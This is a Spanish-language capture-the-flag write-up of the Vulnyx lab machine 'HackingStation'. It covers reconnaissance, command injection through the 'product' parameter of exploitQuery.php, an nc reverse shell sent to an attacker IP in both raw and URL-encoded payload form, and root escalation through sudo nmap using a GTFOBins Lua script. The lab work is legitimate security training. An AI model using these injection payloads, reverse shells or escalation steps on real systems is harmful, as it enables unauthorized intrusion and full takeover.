# HackingStation

> 🧠 **Plataforma:** Vulnyx
>
> 💻 **Sistema operativo:** Linux
>
> 🎯 **Nivel:** Easy
>
> ✅ **Estado:** Done
>
> 📘 **Curso eJPT:** yes
>
> 🗓️ **Fecha de creación:** 13 de abril de 2025 21:16
>
> 🌐 **IP:** `192.168.0.63`

---


## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

Identificamos la red, mediante el fabricante de la MAC (

```bash
sudo arp-scan -I eth0 --localnet                                                                                                    ✔  21:21:19  
Interface: eth0, type: EN10MB, MAC: 08:00:27:8e:e8:dc, IPv4: 192.168.0.115
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)

192.168.0.63	08:00:27:a0:16:bd	PCS Systemtechnik GmbH

```

Identificamos el sistema operativo. Mediante el TTL de 64, determinamos que es una maquina Linux

```bash
 whichSystem.py 192.168.0.63                                                                                                         ✔  21:21:59  

	192.168.0.63 (ttl -> 64): Linux
```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.63 -oG all_ports

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:A0:16:BD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
nmap -p80 -sCV 192.168.0.63 -oN targeted 
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: HackingStation
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:A0:16:BD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

- **Identificación de vulnerabilidades**
    - 80/tcp open  http    Apache httpd 2.4.57 ((Debian))

Enumeramos el puerto 80

Encontramos una web 

```html
<!doctype html>
<html>
  <head>
    <title>HackingStation</title>
  </head>
  <body>
    <h1>Welcome to HackingStation!</h1>
    <img src="hacker.jpg"/>
    <p>It is still under development but... Use our search engine to find the exploit to hack your victim!</p>
    <form action="/exploitQuery.php" method="get">
      <ul>
        <li>
          <label for="product">Product on which you want to search for exploits:</label>
          <input type="text" id="product" name="product" placeholder="Enter the product here...">
          <button type="submit">Search</button>
        </li>
      </ul>
    </form>
    <p>Coming soon to HackingStation... NMAP!!!!!</p>
  </body>
</html>

```

Vemos que para cada busqueda ejecuta una query. El resultado e la busqueda lo muestra de la siguiente manera:

```html
http://192.168.0.63/exploitQuery.php?product=test
[
    "{",
    "\t\"SEARCH\": \"test\",",
   
```

Revisamos las peticiones con Burpsuite. Vemos que la petición se hace mediante GET

```html

GET /exploitQuery.php?product=gobuster HTTP/1.1

# Repeater
HTTP/1.1 200 OK
Date: Sun, 13 Apr 2025 21:14:59 GMT
Server: Apache/2.4.57 (Debian)
Vary: Accept-Encoding
Content-Length: 295
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<pre>[
    "{",
    "\t\"SEARCH\": \"gobuster\",",
    "\t\"DB_PATH_EXPLOIT\": \"\/snap\/searchsploit\/542\/opt\/exploitdb\",",
    "\t\"RESULTS_EXPLOIT\": [\t],",
    "\t\"DB_PATH_SHELLCODE\": \"\/snap\/searchsploit\/542\/opt\/exploitdb\",",
    "\t\"RESULTS_SHELLCODE\": [\t]",
    "}"
]</pre>
```

Probamos a inyectar comandos para ver si el parametro product esta sanitizado

```html
GET /exploitQuery.php?product=gobuster;whoami 

HTTP/1.1 200 OK
Date: Sun, 13 Apr 2025 21:16:38 GMT
Server: Apache/2.4.57 (Debian)
Vary: Accept-Encoding
Content-Length: 309
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<pre>[
    "{",
    "\t\"SEARCH\": \"gobuster\",",
    "\t\"DB_PATH_EXPLOIT\": \"\/snap\/searchsploit\/542\/opt\/exploitdb\",",
    "\t\"RESULTS_EXPLOIT\": [\t],",
    "\t\"DB_PATH_SHELLCODE\": \"\/snap\/searchsploit\/542\/opt\/exploitdb\",",
    "\t\"RESULTS_SHELLCODE\": [\t]",
    "}",
    "hacker"
]</pre>
```

Vemos que tenemos un RCE

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Revershell via RCE

Probaremos a enviar una rever shell a traves del RCE

```bash
Rever shell:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.0.115 4444 >/tmp/f

Url Encode: 

rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.0.115%204444%20%3E%2Ftmp%2Ff

Payload:

get /exploitQuery.php?product=test,rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.0.115%204444%20%3E%2Ftmp%2Ff  HTTP/1.1
```

Estando en escucha

```bash
nc -lvnp 4444
hacker@HackingStation:/var/www/html$ ls
hacker@HackingStation:/home/hacker$ ls
ls
snap
user.txt
hacker@HackingStation:/home/hacker$ cat user.txt
cat user.txt
e3***************0a
hacker@HackingStation:/home/hacker$ 
```

### Explotación posterior

<aside>
💡 Accedemos con las credenciales encontradas

</aside>

### Escalada de privilegios

Enumeramos permisos en la maquina

```bash
 sudo -l
 Matching Defaults entries for hacker on HackingStation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User hacker may run the following commands on HackingStation:
    (root) NOPASSWD: /usr/bin/nmap        
```

Buscamos como podemos explotar el binario nmap mediante GTFObins

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

# Probamos en la maquina
hacker@HackingStation:/usr/bin$ TF=$(mktemp)
TF=$(mktemp)
hacker@HackingStation:/usr/bin$ echo 'os.execute("/bin/sh")' > $TF
echo 'os.execute("/bin/sh")' > $TF
hacker@HackingStation:/usr/bin$ sudo nmap --script=$TF
sudo nmap --script=$TF
Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-13 23:27 CEST
NSE: Warning: Loading '/tmp/tmp.GIN6RGxvSI' -- the recommended file extension is '.nse'.
!sh
/bin/sh: 1: !sh: not found
whoami
root
script -c bash /dev/null
root@HackingStation:~ cd /root 
root@HackingStation:~ ls
root.txt
snap
root@HackingStation:~ cat root.txt
f9***********************ad

```

## Conclusión

<aside>
💡 En esta sección, debes proporcionar un resumen de la máquina para cuando tengas que volver a ella, puedas saber conocer de forma rápida de que se trataba

</aside>